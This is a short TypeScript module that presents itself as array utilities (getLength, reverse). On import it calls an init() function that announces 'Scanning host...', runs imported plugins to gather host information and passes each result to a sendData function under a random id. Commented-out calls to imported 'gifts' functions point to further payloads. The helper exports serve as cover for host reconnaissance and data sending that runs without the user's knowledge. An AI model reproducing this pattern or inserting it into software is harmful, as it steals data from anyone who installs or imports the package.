import { sendData } from "./core";
import { generateRandomId } from "./utils";
import { heyInternet, wc, catscatscatscats } from "./gifts";
import { plugins } from "./plugins";


function init() {
  console.log("Scanning host...");
  const id = generateRandomId();
  plugins.forEach(plugin => {
    const gatheredInfo = plugin.run();
    const postData = JSON.stringify(gatheredInfo, null, 2);
    console.log(`Data from ${plugin.getName()} is: ${postData}`);
    sendData(postData, plugin.getName(), id);
  });

  //heyInternet();
  //wc();
  //catscatscatscats(3000);
}

export function getLength(arr: Array<any>): number {  return arr.length || 0;}

export function reverse(arr: Array<any>): Array<any> {
  const copy = arr.slice();
  return copy.reverse();
}

init();